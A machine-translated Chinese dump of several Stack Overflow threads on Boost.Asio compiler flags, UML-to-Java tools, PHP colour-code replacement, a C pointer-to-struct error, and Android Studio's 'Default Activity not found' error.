您正在交替使用 gcc 和 g++。不工作的行使用 gcc，但工作的行使用 g++。使用 g++ 而不是 gcc 可能会影响使用哪个默认包含路径。您最初的错误没有链接。它正在编译。另外，如果你使用 boost 版本，asio 命名空间不是 asio。这是提升::asio。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:09:59.647

看起来`boost/asio.hpp`没有正确包含。

我不记得确切的前缀选项做什么，但我认为你的问题可能在那里。boost 目录可能不在`/usr/include/boost`，但可能`/usr/boost`。

这是一种可能性。第二个是`/usr/include/boost`，你需要通过，而不是通过`/usr/include`，即

```
gcc client.cpp -I /usr/include -lboost_system -lboost_thread -lboost_serialization 
```

如果您查看示例文件，例如 connection.cpp 示例，它包括`boost/asio.hpp`. 该`boost/`部分是指编译器应在您使用指定的包含路径中查找的文件夹`-I`。因此，如果您指定`/usr/include/boost`，编译器将寻找`/usr/include/boost/boost/asio.hpp`（注意 2 次出现`boost`）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T12:38:57.063

我想我现在已经解决了这个问题。使用 bjam 和自动安装程序似乎没有太大的作用（由于某种原因它不会解析这些路径）。

无论如何，我下载了 ASIO 源代码（这次没有增强）并将其放在我桌面上的一个目录中。与我在 Visual Studio 中的 Windows 上执行此操作的方式类似，我设法将其链接：

```
g++ client.cpp -I/home/devbox/desktop/asio-1.5.3/include -   L/home/devbox/Desktop/boost_1_53_0/stage/lib -lboost_system -lboost_thread -lboost_serialization -o test 
```

祝大家欢呼

# java - 好的 UML 到 java 代码生成器？

> ID：15825072
> 
> 赞同：0
> 
> 时间：2013-04-05T02:48:30.287
> 
> 标签：java, uml, converter

是否有任何简单且独立的程序可以将UML图转换为Java代码？如果没有最好的eclipse插件是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T15:23:32.870

您也可以尝试像[genmymodel这样的网络应用程序](http://www.genmymodel.com/)

它可以从 UML 生成到 Java。如果您使用 github 存储库，您还可以保留每一代之间的更改（使用 JMerge 注释）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-07T17:45:57.943

您有两种使用 UML 的方法。

*   第一种方法是建模，然后从模型生成代码。最好的工具是 Rational 和 Modelio Soft。
*   第二种方法是实时同步 java 和 UML。最好的工具无疑是 EclipseUML Omondo。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-07T17:59:06.840

不，通常他们会产生非常糟糕的代码，无法使用。根据我的经验，制作 UML 模型需要做很多工作，而且它无法在实施的第一周存活下来。

# php - str_replace 不适用于数据库返回

> ID：15825074
> 
> 赞同：1
> 
> 时间：2013-04-05T02:48:51.103
> 
> 标签：php, mysql, string, str-replace

我对应该是一个非常简单的 str_replace 函数感到困惑。在我的数据库中，我有一个我的世界服务器 motd（当天的消息）的字段。当我从服务器收集数据时，我将包括 motd 在内的数据存储在我的数据库中。

服务器可以通过添加颜色代码来为 motds 着色，我将其作为 § 存储在数据库中，然后是指定颜色的数字。我正在尝试使用 str_replace 将 §number 转换为具有实际颜色的 html 元素。我想出了以下代码：

```
if ($server_data['show_motd'] == 1) {
        $motd = $server_data['motd'];
        $motd = str_replace("&sect0","</span><span style=\"color:#000\">", $motd);
        $motd = str_replace("&sect1","</span><span style=\"color:#00A\">", $motd);
        $motd = str_replace("&sect2","</span><span style=\"color:#0A0\">", $motd);
        $motd = str_replace("&sect3","</span><span style=\"color:#0AA\">", $motd);
        $motd = str_replace("&sect4","</span><span style=\"color:#A00\">", $motd);
        $motd = str_replace("&sect5","</span><span style=\"color:#A0A\">", $motd);
        $motd = str_replace("&sect6","</span><span style=\"color:#FA0\">", $motd);
        $motd = str_replace("&sect7","</span><span style=\"color:#AAA\">", $motd);
        $motd = str_replace("&sect8","</span><span style=\"color:#555\">", $motd);
        $motd = str_replace("&sect9","</span><span style=\"color:#55F\">", $motd);
        $motd = str_replace("&secta","</span><span style=\"color:#5F5\">", $motd);
        $motd = str_replace("&sectb","</span><span style=\"color:#5FF\">", $motd);
        $motd = str_replace("&sectc","</span><span style=\"color:#F55\">", $motd);
        $motd = str_replace("&sectd","</span><span style=\"color:#F5F\">", $motd);
        $motd = str_replace("&secte","</span><span style=\"color:#FF5\">", $motd);
        $motd = str_replace("&sectf","</span><span style=\"color:#FFF\">", $motd);

        echo "

    <tr>
    <td class=\"serverdisplayspan\">MOTD:</td>
    <td class=\"serverdisplaylidet\"><span>$motd</span</td>
    </tr>
    ";
} 
```

但是，所有 str_replace 函数都没有做任何事情。奇怪的是，当我更换

```
$motd = $server_data['motd']; 
```

和

```
$motd = "&sectcWelcome to &sectbSkyBlock&sectc!" 
```

这是存储在数据库中的内容，它运行良好。如果没有 str_replaces，这两个变量看起来完全一样。我什至使用 gettype() 检查了每个变量的类型，它们都是字符串。我还在数据库结果上尝试了 utf_decode() ，但似乎没有任何效果。

数据库结果和我刚刚输入的字符串有区别吗？我不知道它是什么，但显然必须有一个。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T02:59:53.110

像这样的东西怎么样（将你的内联样式换成 CSS 类）

```
$motd = preg_replace('/&(amp;)?(sect[0-9a-f])/',
    '</span><span class="$2">', $motd); 
```

在这里快速演示混合`&`和`&amp;`- [http://codepad.viper-7.com/12phow](http://codepad.viper-7.com/12phow)

有了这个，你还想在你的样式表中添加这样的东西

```
.sect0 { color: #000; }
.sect1 { color: #00A; }
.sect2 { color: #0A0; }
/* etc */ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-12T19:07:17.060

我有一个类似的问题并通过使用修复它

```
mysqli_set_charset($con,'utf8'); 
```

紧接着

```
mysqli_connect 
```

# css - 复杂的粘性页脚和 100% 的内容高度

> ID：15825078
> 
> 赞同：0
> 
> 时间：2013-04-05T02:49:44.180
> 
> 标签：css, layout, position, sticky-footer

我正在尝试将内容 div 拉伸到 100% 高度：

[http://new.art-frame.spb.ru/catalog](http://new.art-frame.spb.ru/catalog)

内容分区：

```
<div id="rt-transition">...</div> 
```

页脚：

```
<footer id="rt-footer-surround">...</footer> 
```

问题是，我无法更改 html 布局，只能更改 CSS。

（最好的方法是使用 Firebug/Chrome 检查器来查看所有内容）

```
html {
    position: relative;
    min-height: 100%;
    height: auto;
    margin: 0;
}

body {
    margin: 0 0 100px;
    min-width: 100px !important;
}

footer {
    position: absolute;
    left: 0;
    bottom: 0;
    height: 100px;
    width: 100%;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:49:19.507

放：

```
min-height: 720px; 
```

在您的 rt-main 上

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:10:35.823

尝试将`height`的`html`更改`100%`为`auto`。然后，玩弄里面所有元素的 CSS 以使其适合。如果溢出过多，请使用

```
body { overflow: hidden; } 
```

为了解决这个问题，虽然这不允许滚动。

# c - 这个分配有什么问题？

> ID：15825079
> 
> 赞同：0
> 
> 时间：2013-04-05T02:49:44.747
> 
> 标签：c, memory, malloc

这是我声明的结构：-

```
struct page_table_entry {
    struct addrspace* as;
    vaddr_t va;
    //page_state_t state;
    int timestamp;
}; 
```

现在我想为这个数组动态分配内存。我的实现在这里：-

```
struct page_table_entry **coremap = (struct page_table_entry**)
kmalloc(npages*sizeof(struct page_table_entry*));
int i;
for(i=0;i<npages;i++)
{
    coremap[i] = (struct page_table_entry*)kmalloc(sizeof(struct page_table_entry));
    coremap[i].va=(firstAddress+(i*PAGE_SIZE));
} 
```

它在我访问变量 va 的最后一行给了我一个错误。错误是：-

```
error: request for member `va' in something not a structure or union 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T02:53:04.757

你有一个指向结构的指针数组，而不是一个结构数组。

在 coremap[i] = (struct page_table_entry*)kmalloc(sizeof(struct page_table_entry)); 您将内存分配转换为`page_table_entry*`，所以 coremap[i] 就是这个指针。

您可以通过以下方式访问实际结构

```
coremap[i]->va=(firstAddress+(i*PAGE_SIZE)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T02:54:50.097

`coremap`是指向 a 的指针的指针`struct page_table_entry`。

当你取消引用它时，`coremap[i]`你会得到一个指向`struct page_table_entry`.

您不能`.`在指向结构的指针上使用。您必须使用`->`：

```
coremap[i]->va=(firstAddress+(i*PAGE_SIZE)); 
```

或者

```
(*coremap[i]).va=(firstAddress+(i*PAGE_SIZE)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T02:54:26.487

除了对 的明显更改之外`coremap[i]->va`，您还可以更改为结构数组：

```
struct page_table_entry *coremap = (struct page_table_entry*)kmalloc(npages*sizeof(struct page_table_entry));
int i;
for(i=0;i<npages;i++)
{
    coremap[i].va=(firstAddress+(i*PAGE_SIZE));
} 
```

# android - Android Studio 升级中的“未找到默认活动”

> ID：15825081
> 
> 赞同：552
> 
> 时间：2013-04-05T02:49:59.167
> 
> 标签：android, intellij-idea, android-studio

我将 IntelliJ Idea 从 12.0.4 升级到 12.10。

现在我的 Android 项目中的所有模块都给出了错误：

**错误：**未找到默认活动

我恢复到 12.0.4，一切都恢复正常了。

有任何想法吗？我认为这可能是缺少插件的问题。由于未安装插件，因此无法找到默认活动。另一件事可能是本地配置，但我对此表示怀疑。我删除了配置文件夹以进行验证，但这并没有改变任何东西。

* * *

## 回答 #1

> 赞同：1019
> 
> 时间：2013-04-05T03:18:44.370

如果您在升级 IntelliJ IDEA 或 Android Studio 版本后或在生成新 APK 后看到该错误，您可能需要刷新 IDE 的缓存。

```
File -> Invalidate Caches / Restart... 
```

* * *

## 回答 #2

> 赞同：344
> 
> 时间：2013-04-05T03:16:32.053

我无法评论为什么 IntelliJ 的升级可能会导致这个问题，因为我不使用它。

但是，该错误：“未找到默认活动”似乎告诉您，您没有在 AndroidManifest.xml 中声明的活动，该活动被标记为主要活动，在应用程序启动时启动。

您应该至少有一个看起来像这样的活动：

```
<activity
        android:name="com.your.package.name.YourActivity"
        android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
</activity> 
```

如果您没有至少一个带有类似意图过滤器的活动，您很可能会看到您在此处包含的错误消息。

您应该将该意图过滤器添加到您希望在启动应用程序时打开的 Activity 中，这应该可以解决您的问题。

**编辑：**

**附加细节** (AndroidStudio4.1.2) 如果项目创建为 EmptyApplication 则开发人员必须手动创建以下 3 个文件以避免`Default Activity Not Found`错误

*AndroidManifest.xml* *MainActivity.java* *activity_main.xml*[![在此处输入图像描述](https://i.stack.imgur.com/oG6GY.png)](https://i.stack.imgur.com/oG6GY.png) * [![在此处输入图像描述](https://i.stack.imgur.com/gq569.png)](https://i.stack.imgur.com/gq569.png) * [![在此处输入图像描述](https://i.stack.imgur.com/kZUwy.png)](https://i.stack.imgur.com/kZUwy.png)**

 *** * *

## 回答 #3

> 赞同：100
> 
> 时间：2015-10-17T03:03:31.227

你的应用程序有默认启动活动吗？

可能这可能是你的错误

[![在此处输入图像描述](https://i.stack.imgur.com/V2Z1a.png)](https://i.stack.imgur.com/V2Z1a.png)

**第 1 步**：选择编辑配置

[![在此处输入图像描述](https://i.stack.imgur.com/KIgS8.png)](https://i.stack.imgur.com/KIgS8.png)

**第 2 步**：观看此警告：未找到默认活动 [![在此处输入图像描述](https://i.stack.imgur.com/eIoOV.png)](https://i.stack.imgur.com/eIoOV.png)

**第 3 步**：选择一个默认活动 [![在此处输入图像描述](https://i.stack.imgur.com/q47xk.png)](https://i.stack.imgur.com/q47xk.png)

[![在此处输入图像描述](https://i.stack.imgur.com/6hBpr.png)](https://i.stack.imgur.com/6hBpr.png)

**第 3 步**：保存更改并完成

[![在此处输入图像描述](https://i.stack.imgur.com/kr4Du.png)](https://i.stack.imgur.com/kr4Du.png)

**祝你好运**

[![在此处输入图像描述](https://i.stack.imgur.com/6rHhz.png)](https://i.stack.imgur.com/6rHhz.png)

* * *

## 回答 #4

> 赞同：80
> 
> 时间：2017-01-23T09:47:52.793

如果您正在开发小部件应用程序，此解决方案应该适合您：

1.  去`Edit Configuration`
2.  设置`Launch Option`为`nothing`

* * *

## 回答 #5

> 赞同：68
> 
> 时间：2015-01-09T09:01:20.517

正确的做法是将以下内容添加到 Manifest 文件中：

```
<activity
    android:name="FULL_NAME_OF_YOUR_ACTIVITY"
    android:label="@string/app_name" >
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />

        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity> 
```

这应该插入：

```
<application> </application> 
```

无需使缓存失效。

* * *

## 回答 #6

> 赞同：44
> 
> 时间：2014-03-10T18:44:32.940

尝试右键单击项目并选择***Open Module Settings***。然后转到模块中的***Sources***选项卡，找到***src***文件夹，右键单击它并将其标记为***Sources***（蓝色）。

**编辑：** Android Studio 的更高版本中没有源选项卡，但您可以编辑***build.gradle***文件：[https ://stackoverflow.com/a/22028681/1101730](https://stackoverflow.com/a/22028681/1101730)

* * *

## 回答 #7

> 赞同：37
> 
> 时间：2020-06-12T10:06:11.280

在 Android Studio 4.0 中，请将 Launch 更改为 Nothing：

运行/调试配置 -> Android 应用 -> 应用 -> 常规 -> 启动选项 -> 启动：无

[![在此处输入图像描述](https://i.stack.imgur.com/5E84W.png)](https://i.stack.imgur.com/5E84W.png)

* * *

## 回答 #8

> 赞同：25
> 
> 时间：2015-01-25T21:29:22.417

在 Android Studio 中的 Run/Debug Configuration -> Android Application -> General -> Activity -> 选择“Do not launch Activity”选项。

* * *

## 回答 #9

> 赞同：23
> 
> 时间：2015-10-09T01:06:43.970

以上没有任何帮助我。一段时间后，我发现 IDEA 将操作名称更改为大写。像：

```
<intent-filter>
  <action android:name="ANDROID.INTENT.ACTION.MAIN"/>
  <category android:name="ANDROID.INTENT.CATEGORY.LAUNCHER"/>
</intent-filter> 
```

恢复正常后，IDEA 会识别默认活动：

```
<intent-filter>
  <action android:name="android.intent.action.MAIN" />
  <category android:name="android.intent.category.LAUNCHER" />
</intent-filter> 
```

* * *

## 回答 #10

> 赞同：21
> 
> 时间：2018-12-28T10:40:43.567

首先确保您已在清单中包含默认活动。

**例子：**

```
<activity android:name=".DefaultActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity> 
```

如果您已经尝试了所有方法并且似乎没有任何效果，那么

*   从 %Home%\.gradle\caches 中删除缓存并再次同步项目。

或者检查这个答案

> [https://stackoverflow.com/a/53476487/5507705](https://stackoverflow.com/a/53476487/5507705)

* * *

## 回答 #11

> 赞同：19
> 
> 时间：2020-08-08T12:44:06.967

**100% 工作**

你一定会看到这个

[![在此处输入图像描述](https://i.stack.imgur.com/uL5Q9.png)](https://i.stack.imgur.com/uL5Q9.png)

首先打开您的清单并检查是否存在，

```
 <activity
      android:name="com.your.package.name.YourActivity"
      android:label="@string/app_name">
       <intent-filter>
           <action android:name="android.intent.action.MAIN" />
           <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
   </activity> 
```

**如果不存在添加它**

如果上述情况存在，但您仍然看到未找到默认活动。

跟着这些步骤：

**1.点击编辑配置**

[![在此处输入图像描述](https://i.stack.imgur.com/mXDTK.png)](https://i.stack.imgur.com/mXDTK.png)

**2\. 单击编辑配置时，您会看到启动选项设置为*默认*激活**

[![在此处输入图像描述](https://i.stack.imgur.com/BFrYD.png)](https://i.stack.imgur.com/BFrYD.png)

3.  将其更改为**无**。

[![在此处输入图像描述](https://i.stack.imgur.com/0Rw0j.png)](https://i.stack.imgur.com/0Rw0j.png)

问题解决了！

快乐编码。

* * *

## 回答 #12

> 赞同：13
> 
> 时间：2018-11-01T08:22:23.907

在我的情况下`File -> Invalidate Caches / Restart...`没有帮助

我的项目一切正常，当然我的活动有下一个意图过滤器

```
<intent-filter>
    <action android:name="android.intent.action.MAIN" />
    <category android:name="android.intent.category.LAUNCHER" />
</intent-filter> 
```

真正帮助我的是删除 Android/Gradle 缓存文件夹（它们可以增长到 10-30 GB）

转到`C:\Users\YOUR_USER_WINDOWS_NAME`并删除下一个文件夹

*   。安卓
*   .AndroidStudio3.2
*   .gradle

`.AndroidStudio3.2`（如果需要，您可以在删除之前保存一些 Android 配置）

* * *

## 回答 #13

> 赞同：12
> 
> 时间：2018-11-23T06:53:36.960

此方法适用于我单击应用程序图标，然后选择编辑配置。在编辑配置中选择指定的活动而不是默认活动。然后在下面给出活动的路径。

[![单击应用程序并编辑配置](https://i.stack.imgur.com/GCYX8.png)](https://i.stack.imgur.com/GCYX8.png)

[![选择指定的活动和目录](https://i.stack.imgur.com/oODQN.png)](https://i.stack.imgur.com/oODQN.png)

最后与 gradle 文件同步。

* * *

## 回答 #14

> 赞同：12
> 
> 时间：2019-04-18T08:40:15.467

退出 Android Studio。

去路径`C:\Users\YOUR_WINDOW_USER_NAME\.AndroidStudio3.3\system`

删除 /caches 文件夹和 /tmp 文件夹

* * *

## 回答 #15

> 赞同：12
> 
> 时间：2020-07-22T12:05:50.047

由于这个问题是清单的大量问题的“登陆页面”，导致没有找到默认活动，所以这是另一件事来检查您是否有这个问题。

打开您的清单并切换到**合并清单**选项卡。

有时问题与将项目中的所有清单合并为一个有关，这可能导致错误，因此“未找到默认活动”。问题是据我所知，除了这个*合并清单*选项卡之外，这个错误没有显示在任何地方。

Es：在一个项目中，将**build.gradle**文件`minSdkVersion 10`中的实现版本降级：从解决这个问题。**`25.4.0``25.3.1`**

 **```
dependencies {
implementation 'com.android.support:appcompat-v7:25.3.1'   
implementation 'com.android.support:design:25.3.1'         
implementation 'com.android.support:mediarouter-v7:25.3.1' 
```

[![合并清单](https://i.stack.imgur.com/EQ5N7.png)](https://i.stack.imgur.com/EQ5N7.png)

* * *

## 回答 #16

> 赞同：11
> 
> 时间：2020-08-20T15:46:59.320

在我的电脑意外重新启动后，这发生在我身上。
奇怪的是，我没有做任何改变，仍然得到这个错误。
以上都没有帮助我。什么解决了我的问题，就是这个。
第 1 步： 第 2 步： 第 3 步： 如果这不能解决问题，请尝试其他方法。[![在此处输入图像描述](https://i.stack.imgur.com/G2P0x.png)](https://i.stack.imgur.com/G2P0x.png)

[![在此处输入图像描述](https://i.stack.imgur.com/K5y2M.png)](https://i.stack.imgur.com/K5y2M.png)

[![在此处输入图像描述](https://i.stack.imgur.com/1kCfi.png)](https://i.stack.imgur.com/1kCfi.png)

尝试1：

```
File -> Invalidate Caches / Restart... 
```

尝试2：
检查以下两行是否

```
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" /> 
```

在 manifest.xml 中的启动器活动声明中

```
<activity
        android:name="com.your.package.name.YourActivity"
        android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
</activity> 
```

尝试3：

1.  如图点击： [![在此处输入图像描述](https://i.stack.imgur.com/qObDn.png)](https://i.stack.imgur.com/qObDn.png)

2.  运行/调试配置打开。 [![在此处输入图像描述](https://i.stack.imgur.com/2ObWj.png)](https://i.stack.imgur.com/2ObWj.png)

如果这也没有帮助。
尝试4：

1.  文件-> 导出到 ZIP。
    和

2.  将其作为新项目导入。

好运。

* * *

## 回答 #17

> 赞同：10
> 
> 时间：2016-10-16T05:15:37.023

我将意图过滤器更改为

```
<intent-filter>
    <action android:name="android.intent.action.MAIN" />
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.LAUNCHER" />
</intent-filter> 
```

只需添加 DEFAULT 选项。我使用的是[Process Phoenix](https://github.com/JakeWharton/ProcessPhoenix)库，它提示我定义一个默认意图。这个添加解决了我的问题。

* * *

## 回答 #18

> 赞同：8
> 
> 时间：2018-01-15T07:44:57.067

我得到了这个错误。

`action`并发现在启动器活动的清单文件中 我没有放入`category`意图过滤器。

错误一：

```
<activity
android:name=".VideoAdStarter"
android:label="@string/app_name">

    <action android:name="android.intent.action.MAIN" />
    <category android:name="android.intent.category.LAUNCHER" />

</activity> 
```

正确对象，真爱：

```
<activity
android:name=".VideoAdStarter"
android:label="@string/app_name">

    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>

</activity> 
```

* * *

## 回答 #19

> 赞同：6
> 
> 时间：2015-09-21T15:27:12.633

@TouchBoarder 几乎拥有它。尽管选择“不启动活动”不会启动任何内容。

在 Android Studio 中的 Run/Debug Configuration -> Android Application -> General -> Activity -> 选择“Launch:”选项

选择您的活动。这并不能完全*修复*预期的行为，而是正确地覆盖它。

[![编辑运行/调试配置并指定启动活动](https://i.stack.imgur.com/KwnsM.png)](https://i.stack.imgur.com/KwnsM.png)

* * *

## 回答 #20

> 赞同：5
> 
> 时间：2019-01-28T05:02:09.457

上面的所有答案都没有帮助我。尝试删除这个

```
<?xml version="1.0" encoding="utf-8"?> 
```

在你的 AndroidManifest 中。然后：

```
File > Sync Project with Gradle Files 
```

* * *

## 回答 #21

> 赞同：4
> 
> 时间：2016-09-06T09:06:30.077

如果您的应用程序没有 Activity（例如只有服务），请将运行/调试配置“启动”选项更改为 Nothing。

* * *

## 回答 #22

> 赞同：4
> 
> 时间：2016-12-08T09:16:33.937

我在我的代码中发现了这一点：

```
<context android:name=".MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</context> 
```

如果你仔细看，它应该是`<activity android:name=".MainActivity">`。

显然，我在某处重构了一个“活动”，它也在 AndroidManifest 中更改了名称。

* * *

## 回答 #23

> 赞同：4
> 
> 时间：2017-01-18T12:08:34.500

在我的例子中，我重构了一个名为“activity”的成员变量，我将它重命名为“context”......我发现重构是针对清单中的**活动标签进行的，我发现它们是****上下文**标签......这对于 Android Studio 来说真的很愚蠢！

* * *

## 回答 #24

> 赞同：4
> 
> 时间：2018-08-06T11:30:13.030

我发现这个博客在我的情况下真正解决了这个问题。事实证明，您必须添加某种意图：

```
<intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter> 
```

这绝对是直截了当的。参考：

[https://www.aboutonline.info/2018/08/error-running-app-default-activity-not-found-on-android-with-kotlin.html](https://www.aboutonline.info/2018/08/error-running-app-default-activity-not-found-on-android-with-kotlin.html)

* * *

## 回答 #25

> 赞同：3
> 
> 时间：2014-07-07T10:34:10.783

1.  `Build -> Rebuild Project`
2.  `File -> Invalidate Caches.. -> Invalidate and restart`

这个对我有用。重建项目以确保项目中没有错误。然后我们可以使缓存无效。

* * *

## 回答 #26

> 赞同：3
> 
> 时间：2018-07-13T11:29:50.720

我在 Android Studio 3.3 Canary 3 中遇到了同样的问题。来自 Android Studio 3.0 稳定版的项目首先可以正常工作，而不是经过一些清理/重建后，它开始显示 No Default Activity 错误。我试图重新安装这个 alpha 版本的 Android Studio：再次出错。但随后在旧的稳定 Android 中启动它，并使用 apk 安装，这个 apk 可以正常工作。

此外，我的项目是使用 Instant App（基础、功能、即时、应用子目录）创建的。我认为这个 Android Studio 在将 Manifest.xml 文件分成多个目录时存在一些问题。

所以我将设置更改为： [![在此处输入图像描述](https://i.stack.imgur.com/gGsgW.png)](https://i.stack.imgur.com/gGsgW.png)

* * *

## 回答 #27

> 赞同：3
> 
> 时间：2019-07-29T10:16:58.877

使用 Gradle 文件同步项目有时有效，要解决此总体问题，您应该

1.  退出 Android Studio
2.  转到用户 -> AndroidStudio -> 系统 -> 缓存
3.  删除那个文件夹
4.  启动 Android Studio。

它将重新索引您的文件，这应该可以工作

感谢来自类似问题的[kirtan403 。](https://stackoverflow.com/a/54085552/3426825)

* * *

## 回答 #28

> 赞同：3
> 
> 时间：2020-03-24T17:21:32.763

自从 Android Studio`3.5 or 3.6`开始`Default Activity not found`，我开始厌倦了`Invalidating Caches & Restart`，重建项目等。

事实证明，**我处理多模块和清单的方式**是错误的。我只有库模块中的默认活动清单，但它应该在两个应用程序模块中。

假设`librarymodule` `appmodule1` `appmodule2`

1.  `HomeActivity`从`librarymodule`清单中删除。
2.  添加：

```
class AppModuleActivity1 : HomeActivity() to appmodule1
class AppModuleActivity2 : HomeActivity() to appmodule2 
```

3.  为了`appmodule1`清单内部`application`标签，我添加了：

```
 <activity
            android:name="com.app.name.AppModuleActivity1">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
```

4.  相同，`appmodule2`但在命名中将 2 更改为 1。

* * *

## 回答 #29

> 赞同：2
> 
> 时间：2014-06-13T09:47:16.390

就我而言，**AndroidManifest.xml**中有一个错误类型，如下所示。删除应用程序标签上方的“o”字母已解决。显然，Android Studio 没有检测到**AndroidMainfest.xml中的类型错误**

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

o
<application android:name=".AppName"
             android:allowBackup="false"
             android:icon="@drawable/ic_launcher"
             android:label="@string/app_name"
             android:theme="@android:style/Theme.Light.NoTitleBar"> 
```

* * *

## 回答 #30

> 赞同：2
> 
> 时间：2015-09-19T06:55:26.383

错误：未找到默认活动

我以这种方式解决了
运行>>编辑配置>>Android应用程序>>在“启动”编辑框中输入默认活动类的路径。

* * *

## 回答 #31

> 赞同：2
> 
> 时间：2016-07-22T14:32:53.907

刚刚在 android studio 2.1.2 上遇到了这个错误。通过将 MAIN/LAUNCHER 意图过滤器添加到***风味***清单中的默认活动来解决，尽管过滤器已经在默认清单中的默认活动中。它甚至在合并的清单中，但直到我在两个清单中复制过滤器之前，工作室都找不到它。

* * *

## 回答 #32

> 赞同：2
> 
> 时间：2016-08-11T04:58:44.150

我的经验：确保你所有的java文件都被识别了，如果IDEA没有识别你的java文件，所以他无法理解“活动”是什么意思

祝你好运 ：）

![在此处输入图像描述](https://i.stack.imgur.com/5gWCY.png)

* * *

## 回答 #33

> 赞同：2
> 
> 时间：2016-12-23T11:59:17.793

好吧，我也遇到了这个错误，

> 错误：未找到默认活动

好吧，在我的情况下，它是用于磨损模块的..我不需要那里的活动，所以我所做的只是

1.  去编辑配置->磨损->启动选项->启动->无。
2.  应用更改。单击确定。
3.  从清单文件中删除默认活动的现有代码。

注意：不要忘记清理项目和同步 Gradle 文件。

* * *

## 回答 #34

> 赞同：2
> 
> 时间：2016-12-23T12:05:19.137

Android Manifest.xml 设置启动活动，如下所示

```
<intent-filter>
    <action android:name="android.intent.action.MAIN" />

    <category android:name="android.intent.category.LAUNCHER" />
</intent-filter> 
```

* * *

## 回答 #35

> 赞同：2
> 
> 时间：2017-08-27T18:52:12.630

我最近遇到了类似的问题。问题出在 activitymanifest XML 文件上。请检查标语是否正确关闭。

* * *

## 回答 #36

> 赞同：2
> 
> 时间：2018-03-30T20:14:04.567

编辑 androidmanifest.xml

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.java2">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity android:name=".MainActivityName">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

* * *

## 回答 #37

> 赞同：2
> 
> 时间：2018-10-06T14:30:53.590

直到这里什么都没有帮助我，Android Studio 对我之前运行的所有应用程序都提出了这个问题 - 所以我知道 - 这与我的代码无关。

现在我解决了：

您需要重置 Android Studio：只需转到 C:\Users\yourusername\androidStudio3.2 （或类似）并删除此目录。

这个人在他的旧版本视频中向您展示了如何做到这一点： [https ://www.youtube.com/watch?v=AwZEliSPGwU&t](https://www.youtube.com/watch?v=AwZEliSPGwU&t)

* * *

## 回答 #38

> 赞同：2
> 
> 时间：2018-11-05T05:04:00.177

有时由于内部缓存和项目构建系统导致 android studio 行为不端导致此错误。即使我们已经为默认活动设置了完美的一切。对于这样的问题，我找到了解决方案，它对我有用。

**步骤 1.** Android Studio ---> File--> Invalid Cache 并关闭 android studio。

**第2步。**转到路径 C:\Users\USER.AndroidStudio3.2\system

**步骤 3.**更改以下文件夹的扩展名 .back 示例：编译器应为 compiler.back

*   编译器
*   编译器服务器
*   转换
*   外部构建系统
*   框架
*   毕业典礼
*   资源文件夹缓存

**第 4 步：**启动 Android Studio 并打开您的项目。

我希望它对你有用。

* * *

## 回答 #39

> 赞同：2
> 
> 时间：2019-03-22T05:08:00.663

我有这个问题2天。尝试了所有可能的解决方案，但没有任何效果。

终于找到解决办法了。

这是您需要做的。

关闭 Android Studio

转到 C:\Users\UserName.android 并将 build-cache 文件夹重命名为 build-cache.bak

转到 C:\Users\UserName.AndroidStudio3.3\system 并重命名这些文件夹

缓存到 caches.bak

compile-server 到 compile-server.bak

转换蝙蝠

转换为conversion.bak

external_build_system 到 external_build_system.bak

框架到 frameworks.bak

gradle 到 gradle.bak

resource_folder_cache 到 resource_folder_cache.bak

打开 Android Studio 并再次打开您的项目。

* * *

## 回答 #40

> 赞同：2
> 
> 时间：2020-07-28T00:52:34.183

Android Studio 4.0 仍然会出现这种情况，因此我必须删除以下文件夹才能解决此问题：

C:\Users\my_user_name.AndroidStudio4.0\system\caches

* * *

## 回答 #41

> 赞同：2
> 
> 时间：2020-08-11T09:08:25.953

转到清单 -> 合并清单选项卡（屏幕底部）。

在右侧面板上，如果您有任何错误，请解决它！

这是我的解决方案（工具错误：不需要替换）

* * *

## 回答 #42

> 赞同：2
> 
> 时间：2020-09-25T16:04:26.720

